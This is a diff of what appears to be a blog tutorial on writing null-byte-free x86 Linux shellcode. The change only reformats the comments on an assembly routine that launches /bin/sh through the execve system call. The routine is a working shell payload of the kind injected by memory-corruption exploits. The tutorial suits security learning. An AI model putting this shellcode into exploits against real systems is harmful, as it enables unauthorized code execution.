@@ -34,17 +34,17 @@ uid=0(root) gid=0(root) groups=0(root)
 But this code is not nullbyte free and it's a problem when we are working with shellcodes, so with some work I got this code,
 
 {% highlight Bash %}
-xor eax,eax ;zero to eax
-push eax ;put 0 in stack, end of string
+xor eax,eax 		; zero to eax
+push eax 				; put 0 in stack, end of string
 push 0x68732f6e ; part of /bin/sh
 push 0x69622f2f ; part of /bin/sh
-mov ebx,esp; mov /bin/sh to ebx
-push eax; put NULL on argv
-push ebx; put filename on stack
-mov ecx, esp; put filename to ecx
-xor edx,edx; envp = NULL
-mov al,0x0b; 0x0b to call sys_execve
-int 0x80; kernel interrupt
+mov ebx,esp			; mov /bin/sh to ebx
+push eax				; put NULL on argv
+push ebx				; put filename on stack
+mov ecx, esp		; put filename to ecx
+xor edx,edx			; envp = NULL
+mov al,0x0b			; 0x0b to call sys_execve
+int 0x80				; kernel interrupt
 {% endhighlight %}
 
 To confirm if my code is free of nullbytes, I used this site <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">defuse.ca</a>, that translate asm instructions to opcodes or just use objdump, and now I have a shellcode free of nullbytes with 25 bytes because the shellcode does not need the prologue
